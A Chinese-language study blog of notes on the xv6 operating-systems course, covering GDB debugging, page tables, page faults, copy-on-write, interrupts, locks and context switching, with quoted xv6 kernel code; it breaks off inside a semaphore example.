<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>我使用的是最新的ubuntu22,其实完全不用搜什么搭建环境教程的，课程的网页已经非常清楚了（他推荐的是ubuntu20.4），按照它所述一步一步来就好了，可惜我意识到这一点的时候已经浪费了一两个小时了</p>
<p>准备完环境最激动人心的就是实验调试环境解了，调试我参考的是这篇文章<a target="_blank" rel="noopener" href="https://xistor.github.io/post/6.s081/xv6-gdb/">qemu xv6 使用GDB调试 - xistor’s notes</a></p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220806173357404.png" alt="image-20220806173357404"></p>
<p>我在ls上下了断点，可见成功截住了。</p>
<p>从这篇文章中了解到了关于<del>/.gdbinit文件的使用，可以向这个文件中写入gdb命令，当gdb执行的时候会在当前用户的主目录下寻找<code>.gdbinit</code>文件然后执行其中的命令，当你想要gdb执行不在当前用户的主目录下的<code>.gdbinit</code>的时候，可以在`</del>/.gdbinit<code>文件中导入，例如</code>add-auto-load-safe-path /home/x/xv6-labs-2021/.gdbinit<code>,这样做的话调试的时候就非常方便了，只需要键入</code>gdb-multiarch`就可以直接设置架构并连接qemu了。</p>
<h2 id="Lecture"><a href="#Lecture" class="headerlink" title="Lecture"></a>Lecture</h2><h4 id="Lecture1"><a href="#Lecture1" class="headerlink" title="Lecture1"></a>Lecture1</h4><p>讲了一点操作系统大体作用以及结构，然后通过几个例子示范了系统调用，其中比较有收获的是fork+exec两个系统调用的搭配可以在子进程重新载入一个新程序，所以原来的子进程被完全取代，一般情况下exec函数不会返回。值得注意的是exec()后的程序的文件描述符并没有重置，还是和源程序一样，利用这个特性可以完成一些骚操作。</p>
<p>总体比较简单。这节课有课后实验，我看课程介绍好像可以在本地测试自己的实验并打出分数，吆西，明天看看怎么整。</p>
<h4 id="Lecture3"><a href="#Lecture3" class="headerlink" title="Lecture3"></a>Lecture3</h4><p><strong>隔离性</strong>：操作系统提供进程和进程之间的墙隔离以及进程和硬件资源的强隔离，隔离的手段是进行抽象，提供系统调用接口。</p>
<p><strong>防御性</strong>：首先得具有错误处理能力，如果用户态进程使用系统调用的时候传入了错误的参数，内核得具有处理这种错误的能力，其次是应用程序不能破坏隔离性，这里的隔离指进程和内核的隔离，想要实现这种隔离性得需要硬件支持，比如内核模式和用户模式以及虚拟内存。</p>
<p><strong>user/kernel</strong>:当cpu运行在kernel模式中就会拥有执行特权指令的权限，特权指令指直接操作硬件的指令，相对的运行在user模式只能执行非特权指令，当user模式下执行特权指令时cpu并不会真正去执行，而是从user跳到kernel，内核获得cpu控制权，然后让内核判断user是否出现了问题是否改杀死。</p>
<p><strong>user-&gt;kernel</strong>:有专门的的一个指令可以从user到kernel,在x86下是syscall,在本次课程中的risc-v中是<code>ecall</code>，系统调用号存储在<code>a0</code>寄存器中。</p>
<p><strong>宏内核&amp;微内核</strong>：相比起宏内核，微内核的诸多服务都运行在user模式，在普通进程想要使用这些服务的时候通知内核，内核再通知服务，这样会导致User和kernel的切换比较频繁。</p>
<h4 id="Lecture4"><a href="#Lecture4" class="headerlink" title="Lecture4"></a><strong>Lecture4</strong></h4><blockquote>
<p>对虚拟内存的看法</p>
<p>在我看来虚拟内存主要有两点，一点是完美的进程隔离，每个进程都有自己的页表，不会访问到其他进程的页表，二是不直接操作物理内存，也就是硬件，会比较好的保护硬件</p>
</blockquote>
<p>risc-v虚拟内存简单理解：和x86很类似，也有一个mmu路由对cpu想要访问的虚拟地址进行翻译，翻译成物理内存，<code>stap</code>寄存器就存放着进程的页表的物理地址，也表中就存放着虚拟内存到物理内存的映射，mmu就通过访问stap来进行翻译</p>
<p><strong>页表设计</strong></p>
<p>在xv6操作系统中虚拟地址的前25位并没有被使用，所以尽管寄存器是64位，物理地址是56位，但其寻址空间还是2^39，在这39位中前27位是索引，后12位是偏移。</p>
<p>xv6的页表设计是采用三级页表的，不像x86的四级页表，之所以采用三级页表，是因为一个页表占用4k,每一个页表项所占用的内存是2^3,所以一个页表可以有2^9个页表，27/9=3,所以三个页表就完全够映射所有的索引了。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220824152319391.png" alt="image-20220824152319391"></p>
<p>每一个页表项是64位其中最高的10位并没有被使用，因为没必要，然后后44位记录页编号（因为一共只有2^44个页），然后后10位记录一些标志，用来标识这个页表项。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220824153329033.png" alt="image-20220824153329033"></p>
<p><strong>TLB</strong></p>
<p>采用三级页表的话得到一个具体的物理地址就需要访问访问内存三次，这是非常昂贵的，所以就像x86有缓存一样，xv6也有缓存，也叫作TLB，储存着最近访问的虚拟地址到物理地址之间的映射。</p>
<p>在xv6操作系统中似乎还没有实现多个进程使用同一个TLB,所以当切换进程的时候也需要刷新TLB防止映射出错。TLB还是一个硬件，并不由操作系统具体控制。</p>
<p><strong>虚拟地址分布和物理地址分布</strong></p>
<p>物理内存的分布都是有设计者控制的，并不由操作系统控制，在物理内存下面的那些位置并不是真实存在于内存中的，而是一种映射，比如中断或者io什么的。</p>
<p>为了让xv6操作系统能够比较简单简约，虚拟地址都是采用恒等映射的。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220824160019857.png" alt="image-20220824160019857"></p>
<p>上面的虚拟地址分布似乎只是内核虚拟地址分布，内核会在<code>free memory</code>中为进程分配空间，下面是进程的虚拟地址分布</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220824164115781.png" alt="image-20220824164115781"></p>
<h4 id="Lecture5"><a href="#Lecture5" class="headerlink" title="Lecture5"></a><strong>Lecture5</strong></h4><p>本节课程主要是讲解<code>risc-v</code></p>
<p>在gdb中输入<code>tui enable</code>就能进入一个界面，在界面中输入<code>layout asm</code>或者<code>layout reg</code>，<code>layout src</code>就能查看汇编或者寄存器的值或者源代码了。如果想要聚焦某个窗口就可以输入<code>focus xxx</code></p>
<p>终于学会了怎么自动开多个shell平铺到桌面了，首先输入<code>tmux</code>,打开一个shell,在打开一个shell就是先同时按<code>ctrl+b</code>然后单独按<code>c</code>,然后可以使用<code>ctrl+b</code>+p/n来切换shell窗口，可以使用<code>ctrl b</code>+<code>shift+%</code>切出新窗口，然后使用<code>ctrl+b</code>+o来切换窗口。</p>
<p>使用<code>bt</code>可以查看调用栈</p>
<p>条件断点命令<code>b xxx if i==5</code></p>
<p>寄存器表</p>
<p>a0<del>a7可以存放函数调用参数，a0</del>a1可以存放返回值</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220901133841549.png" alt="image-20220901133841549"></p>
<h5 id="risc-v的函数调用"><a href="#risc-v的函数调用" class="headerlink" title="risc-v的函数调用"></a>risc-v的函数调用</h5><p>和记忆中mips的函数调用很类似，risc-v中有一个寄存器专门用来记录这个函数的返回地址，当执行<code>ret</code>的函数，就会把pc指向<code>ra</code>寄存器保存的地址，但是ra寄存器只有一个，但是函数a可以调用函数b,当执行函数b的时候，ra寄存器指向函数b的返回值，但是函数b也可以调用函数c,当执行函数c的时候ra保存函数c的返回值，当返回到函数b的时候，ra还是指向了函数c的返回值，这样就会造成死循环了，所以risc-v就有一个策略，当指向非叶子函数（也就是这个函数还会调用其他函数），就会把ra保存到栈里，当函数返回的时候先把栈里的返回地址加载到ra中再执行<code>ret</code>指令，当执行叶子函数的时候，就不会在栈里保存ra寄存器了，当执行<code>ret</code>的时候直接加载<code>ra</code>寄存器。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220901210847634.png" alt="image-20220901210847634"></p>
<h4 id="Lecture6"><a href="#Lecture6" class="headerlink" title="Lecture6"></a>Lecture6</h4><p>在内核态的时候权限提升主要体现在两点，一点是可以读写控制寄存器，第二点是可以可以使用没有<code>pte_u</code>的页表。</p>
<p>这是sh程序的页表，可以清晰的看见虚拟地址到物理地址的映射，比较有收获的就是，设置了u权限的页表，用户态才可以使用，其次是陷阱帧trapframe虽然每个进程都有自己的一份，但是所有进程的虚拟地址都是一样的<code>#define TRAPFRAME (TRAMPOLINE - PGSIZE)</code>。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220906160934534.png" alt="image-20220906160934534"></p>
<p>在执行<code>ecall</code>的时候会关闭中断，这样就不会发生进程切换了，然后在执行<code>sret</code>的时候又会打开中断，如果不进行其他操作，当用户态程序陷入内核态的时候并不会发生进程切换，但是这样做并不适合所有情况，当进行系统调用的时候就可以进程切换，打开中断和关闭中断的函数分别是<code>intr_on()</code>和<code>intr_off()</code>，当执行完系统调用的时候又会关闭中断。</p>
<h4 id="Lecture8"><a href="#Lecture8" class="headerlink" title="Lecture8"></a>Lecture8</h4><p><strong>页面错误(page faults)</strong></p>
<p>其实可以利用页面错误配合虚拟内存来完成好多有意思的事情，比如说fork的写时复制或者惰性分配。</p>
<p>在发生页面错误时我们可以知道三个信息，首先是错误地址，得知道错误地址才能去处理他，这个错误地址就保存在<code>stval</code>寄存器中，第二点就是得知道页面错误的类型，这个类型就存储在<code>scause</code>寄存器中。第三件点得知道引起页面错误的指令的虚拟地址，这个地址就存储在<code>sepc</code>中。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908204934721.png" alt="image-20220908204934721"></p>
<p><strong>惰性分配</strong></p>
<p>惰性分配实际就是一个空头支票，并不分配物理内存和映射，而是先增大p-&gt;sz,当使用这段内存的时候才根据<code>scause</code>的值确定页面错误类型然后分配内存并且映射，所以在srbk中并不需要映射，而是增大p-&gt;sz的值就可以了，大概思路如下图代码，比较好理解</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908210855042.png" alt="image-20220908210855042"></p>
<p>但是这样又会导致另一个错误，当惰性分配后，可能的情况就是有些真的分配了，有的没有分配，当释放这个进程的内存的就是后就会发生如下bug</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908211459524.png" alt="image-20220908211459524"></p>
<p>简单的解决方案就是释放进程内存的时候条件放的宽松一点，原本的uvnunmap是如果检测到了不存在的映射直接<code>panic</code>,我们可以修改成<code>continue</code></p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908211750910.png" alt="image-20220908211750910"></p>
<p>很熟悉的bss段也可以利用惰性分配，类似下图，先让bss全部映射到一个只有读权限的页面，当有一个地址想要写入内容的时候就会触发页面错误，进而可以给他分配一个新的页面。<img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908213940714.png" alt="image-20220908213940714"></p>
<p><strong>COW</strong></p>
<p>copy on write，也就是fork的写时复制技术，当fork的时候，把父子进程都映射到原先父进程的物理内存上，但是他们都是<code>r</code>。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908221824481.png" alt="image-20220908221824481"></p>
<p>然后当子进程想要在这段内存中写入内容时就会发生页表错误，然后可以重新申请一个页面，把发生错误的页面的内容复制到新申请的页面上，然后把这个页面映射到子进程中，原先错误的虚拟地址就指向了这个新的页面，然后把父进程的权限变成<code>rw</code>,然后重新执行发生页面错误的指令。</p>
<p>但是如果使用往一个只读页面中写入内容来判断是否是写时复制其实是不准确的，因为有些页面本来就是只读内容，这样就会破坏这些页面的内容了。在pte中还存在一位叫做<code>RSW</code>,可以把这一位设置成是否是<code>cow</code>页面的标志。</p>
<p>上述的<code>cow</code>策略并不完美，当一个父进程fork了多个子进程之后，父进程exit的话显然不能直接释放父进程的页面，因为所有子进程都指向这些页面，所以得给每个页面加个引用计数，当计数为0的时候才会真正释放这个页面。</p>
<p><strong>按需分配</strong></p>
<p>按需分配是内存扩展的精髓，当在内存中加载文件时并不是全部都加载进去，而是按需加载，然后当内存用完之后再驱逐一些近期不用的页面腾出空间。</p>
<h4 id="Lecture9"><a href="#Lecture9" class="headerlink" title="Lecture9"></a>Lecture9</h4><h5 id="book-read"><a href="#book-read" class="headerlink" title="book read"></a>book read</h5><p>这一节是关于中断的，以前总是对中断模模糊糊的，不是很清楚，通过阅读本节内容和网上的资料，终于对中断有了一个较为清晰的概念了。</p>
<p>中断其实就是在CPU正在做某件事的时候，收到了通知告诉CPU你要放下手头现在做的事，去处理另一件事（当然这个是立即处理还是过一会处理以及如何处理取决于中断的类型）。可以先把中断分为两种，一种是外部中断，一种是内部中断。</p>
<p>外部中断也叫硬件中断，由硬件向cpu发出中断信号，然后cpu停下来处理这个中断，此时cpu是知道是那个设备发出的中断的，有个中断号，然后根据这个中断号调用对应的中断驱动程序对这个中断完成处理，这样一看cpu就像一个后端一样，根据请求信息处理对应事件。</p>
<p>内部中断就是指cpu内部出现的中断，系统调用就是内部中断。</p>
<h5 id="课程内容"><a href="#课程内容" class="headerlink" title="课程内容"></a>课程内容</h5><p>当通上电以后，设备也是在运行的，cpu也是在运行的，两个可以说是在并行运行，既然是在并行运行，就需要处理两者之间的同步性问题，而中断就可以处理这个问题。</p>
<p>PCLI是cpu内部的一个模块，是对外部设备中断的管理者，</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220920231732880.png" alt="image-20220920231732880"></p>
<p>驱动程序分为上下两部分，下半部分是中断处理程序，上半部分在我看来是缓存区，比如<code>uart</code>设备的可以把接收或者发送的字符串放在上半部分，然后就可以完成了设备和cpu的解耦。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220920233006328.png" alt="image-20220920233006328"></p>
<p><code>$ ls</code>的工作过程，看的不是很懂，关于uart的部分。</p>
<p>后续,稍微理解了uart，他是一个用于辅助计算机和设备通信的芯片，当计算机向设备发送数据的时候，通过uart串口把字节转换成一位一位的，然后设备把一位一位的数据传递给计算机的时候，通过uart串口把一位一位的数据转化成字节流传递给计算机。</p>
<p>打印<code>$</code>的流程就是先把<code>$</code>放入到uart的一个寄存器中，然后产生一个中断，把储存的字符发送到另一个uart中，这个uart链接到了虚拟控制台。</p>
<p>发送<code>ls</code>时，首先键盘会把字符发送到与之链接的uart上，然后uart发送数据到另一个uart上，这个uart拿到数据后就会产生一个中断，告诉计算器键盘输出了字符。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220921001534980.png" alt="image-20220921001534980"></p>
<p>当中断要被某一个cpu处理的时候，这个cpu对应寄存器的变化如下</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221005194949276.png" alt="image-20221005194949276"></p>
<p>中断有点难理解，课上的内容半懂不懂的，有时间看看源码再理解一下吧。</p>
<h4 id="Lecture10"><a href="#Lecture10" class="headerlink" title="Lecture10"></a>Lecture10</h4><p>这节课的主要内容是锁</p>
<p>需要锁的主要原因就是cpu是多核的，每个核都可能有一个程序流，这些程序流可能访问同一个共享数据，内核中就有很多全局数据结构，当多个进程在不同核心上运行然后同时进入系统调用就可能发生同时访问共享数据的问题。总而言之就是解决并行性系统中访存共享数据的问题。</p>
<p>锁会序列化操作，即可以控制并行系统关于同一个共享数据的访问顺序，通一个时刻内，只有一个核可以访问共享数据段，当然，这势必会造成性能损失。</p>
<p>比如freelist就可能造成条件竞争。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221010104133931.png" alt="image-20221010104133931"></p>
<p>在xv6中关于锁主要有两个函数调用<code>acquire()</code>和<code>release()</code>，第一个函数是获得锁，第二个函数是释放锁。</p>
<p>锁可以有粗粒度锁和细粒度锁</p>
<p>锁可以解决条件竞争的问题，但是也会带来自己的问题，也就是众所周知的死锁问题。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221011001902538.png" alt="image-20221011001902538"></p>
<p>加锁这个过程必须是原子序列的，在xv6中，使用的是amoswap指令完成加锁，原理就是amoswap会对addr这个地址加锁，然后执行完后面三个后再解锁，最后判断r2的值来判断是否获得锁了。如果等于0就是获得锁，如果等于1就是没有获得锁，秒啊。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221011010830326.png" alt="image-20221011010830326"></p>
<p>老师提到的一个解决死锁问题的办法是把所有锁进行一个排序，然后进程获得多个锁的时候就按照这个顺序来获取，这样确实可以避免比较典型的死锁问题。但是排序问题似乎也很麻烦，需要一个好的策略。</p>
<p>锁对性能肯定会造成损失，要想尽可能不造成损失，只能尽可能对把共享数据结构细化，然后锁就能尽可能的细粒度，性能就能损失的尽可能少，但是这是非常复杂的，系统越大越不好实现，老师给出的观点是先使用粗粒度的锁，然后看有没有条件竞争，再细化锁。</p>
<p>所有核心想要进行内存操作都会经过一个内存控制器，硬件锁就是利用此完成对特定地址加锁，让执行几步操作后对此解锁。</p>
<h4 id="Lecture11"><a href="#Lecture11" class="headerlink" title="Lecture11"></a>Lecture11</h4><h5 id="book-read-1"><a href="#book-read-1" class="headerlink" title="book-read"></a>book-read</h5><p><strong>上下文切换</strong></p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221011163736314.png" alt="image-20221011163736314"></p>
<p>每个cpu都有自己的调度程序线程以及调度程序栈，其上下文保存在cpu-&gt;context中，当shell进程切换到cat进程的时候，首先在shell的内核线程中调用<code>yield()</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">yield</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  acquire(&amp;p-&gt;lock);</span><br><span class="line">  p-&gt;state = RUNNABLE;</span><br><span class="line">  sched();</span><br><span class="line">  release(&amp;p-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先把当前进程的状态位改成<code>RUNNABLE</code>,然后调用<code>sched()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">sched</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> intena;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!holding(&amp;p-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;sched p-&gt;lock&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(mycpu()-&gt;noff != <span class="number">1</span>)</span><br><span class="line">    panic(<span class="string">&quot;sched locks&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;state == RUNNING)</span><br><span class="line">    panic(<span class="string">&quot;sched running&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(intr_get())</span><br><span class="line">    panic(<span class="string">&quot;sched interruptible&quot;</span>);</span><br><span class="line"></span><br><span class="line">  intena = mycpu()-&gt;intena;</span><br><span class="line">  swtch(&amp;p-&gt;context, &amp;mycpu()-&gt;context);</span><br><span class="line">  mycpu()-&gt;intena = intena;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要就是调用了<code>swtch()</code>函数来保存上下文并恢复调度线程上下文，执行调度线程。</p>
<p>swtch中主要就是sd和ld,当最后执行ret的时候就返回到了调度程序线程上下文了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">000000008000267a &lt;swtch&gt;:</span><br><span class="line">    8000267a:	00153023          	sd	ra,0(a0)</span><br><span class="line">    8000267e:	00253423          	sd	sp,8(a0)</span><br><span class="line">    80002682:	e900                	sd	s0,16(a0)</span><br><span class="line">    80002684:	ed04                	sd	s1,24(a0)</span><br><span class="line">    80002686:	03253023          	sd	s2,32(a0)</span><br><span class="line">    8000268a:	03353423          	sd	s3,40(a0)</span><br><span class="line">    8000268e:	03453823          	sd	s4,48(a0)</span><br><span class="line">    80002692:	03553c23          	sd	s5,56(a0)</span><br><span class="line">    80002696:	05653023          	sd	s6,64(a0)</span><br><span class="line">    8000269a:	05753423          	sd	s7,72(a0)</span><br><span class="line">    8000269e:	05853823          	sd	s8,80(a0)</span><br><span class="line">    800026a2:	05953c23          	sd	s9,88(a0)</span><br><span class="line">    800026a6:	07a53023          	sd	s10,96(a0)</span><br><span class="line">    800026aa:	07b53423          	sd	s11,104(a0)</span><br><span class="line">    800026ae:	0005b083          	ld	ra,0(a1)</span><br><span class="line">    800026b2:	0085b103          	ld	sp,8(a1)</span><br><span class="line">    800026b6:	6980                	ld	s0,16(a1)</span><br><span class="line">    800026b8:	6d84                	ld	s1,24(a1)</span><br><span class="line">    800026ba:	0205b903          	ld	s2,32(a1)</span><br><span class="line">    800026be:	0285b983          	ld	s3,40(a1)</span><br><span class="line">    800026c2:	0305ba03          	ld	s4,48(a1)</span><br><span class="line">    800026c6:	0385ba83          	ld	s5,56(a1)</span><br><span class="line">    800026ca:	0405bb03          	ld	s6,64(a1)</span><br><span class="line">    800026ce:	0485bb83          	ld	s7,72(a1)</span><br><span class="line">    800026d2:	0505bc03          	ld	s8,80(a1)</span><br><span class="line">    800026d6:	0585bc83          	ld	s9,88(a1)</span><br><span class="line">    800026da:	0605bd03          	ld	s10,96(a1)</span><br><span class="line">    800026de:	0685bd83          	ld	s11,104(a1)</span><br><span class="line">    800026e2:	8082                	ret</span><br></pre></td></tr></table></figure>

<p>这个是<code>scheduler</code>函数，切换上下文后，就会执行<code>swtch</code>的下一条语句了，比较饶的就是获得锁和释放锁应该是一个进程干的事情，但是在调度的时候并不是这样，首先在<code>yield</code>中获得锁，然后在<code>scheduler</code>释放锁，目的保护进程不被其他cpu调度。看似形不成一个闭环，但其实是可以的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">scheduler</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> *<span class="title">c</span> =</span> mycpu();</span><br><span class="line">  </span><br><span class="line">  c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">// Avoid deadlock by ensuring that devices can interrupt.</span></span><br><span class="line">    intr_on();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> nproc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">      acquire(&amp;p-&gt;lock);</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state != UNUSED) &#123;</span><br><span class="line">        nproc++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state == RUNNABLE) &#123;</span><br><span class="line">        <span class="comment">// Switch to chosen process.  It is the process&#x27;s job</span></span><br><span class="line">        <span class="comment">// to release its lock and then reacquire it</span></span><br><span class="line">        <span class="comment">// before jumping back to us.</span></span><br><span class="line">        p-&gt;state = RUNNING;</span><br><span class="line">        c-&gt;proc = p;</span><br><span class="line">        swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Process is done running for now.</span></span><br><span class="line">        <span class="comment">// It should have changed its p-&gt;state before coming back.</span></span><br><span class="line">        c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nproc &lt;= <span class="number">2</span>) &#123;   <span class="comment">// only init and sh exist</span></span><br><span class="line">      intr_on();</span><br><span class="line">      <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;wfi&quot;</span>)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>xv6为每个cpu准备了一个<code>struct cpu</code>,这个结构体里就会记录着这个cpu当前运行的<code>proc</code>等等，所有的<code>struct cpu</code>保存在一个数组里，利用当前cpu的<code>tp</code>寄存器的值进行索引。</p>
<p><strong>sleep/wakeup</strong></p>
<p>生产者是一个线程，消费者是一个线程，两个线程之间得需要一个同步机制来协调，比如生产者生产一个产品，消费者才能消费一个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">V</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;count += <span class="number">1</span>;</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (s-&gt;count == <span class="number">0</span>)</span><br><span class="line">        ;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;count -= <span class="number">1</span>;</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码没问题，但是对于消费者来说，如果生产者没有生产的话，那就得一直自旋，十分浪费cpu资源，当引进同步机制后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">V</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;count += <span class="number">1</span>;</span><br><span class="line">    wakeup(s);</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (s-&gt;count == <span class="number">0</span>)</span><br><span class="line">        sleep(s, &amp;s-&gt;lock);  <span class="comment">// !pay attention</span></span><br><span class="line">    